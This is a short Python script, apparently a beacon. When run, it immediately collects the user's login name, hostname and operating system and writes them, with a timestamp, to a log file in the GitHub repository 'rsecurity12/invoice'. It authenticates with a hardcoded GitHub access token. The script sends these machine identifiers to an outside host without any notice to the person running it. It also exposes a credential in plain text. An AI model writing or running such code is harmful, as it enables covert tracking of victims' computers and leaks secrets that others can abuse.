import socket
import platform
import base64
import getpass
import datetime
from github import Github
import datetime


def create_file():
    access_token ='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'
    folder_path ='logs'
    status ="blsasasasasabla"
    current_datetime = datetime.datetime.now()
    content = f"Script Name: X .\nExecution time: {current_datetime}\nStatus: {status}\n\n"
    username = getpass.getuser()
    hostname = socket.gethostname()
    os_name = platform.system()
    filename = os_name + "_" + hostname + "_" + username
    g = Github(access_token)
    repo = g.get_repo("rsecurity12/invoice")
    try:
        existing_file = repo.get_contents(f"{folder_path}/{filename}")
        sha = existing_file.sha
        existing_content = base64.b64decode(existing_file.content).decode()
        new_content = existing_content + '\n' + content
        repo.update_file(existing_file.path, "Update log", new_content, sha)
        print("File updated successfully.")
    except Exception as e:
        if 'Not Found' in str(e):
            new_file = repo.create_file(f"{folder_path}/{filename}", "New log", content)
            print("File created successfully.")
        else:
            print("Failed to check file existence:", str(e))
            
            
            
create_file()
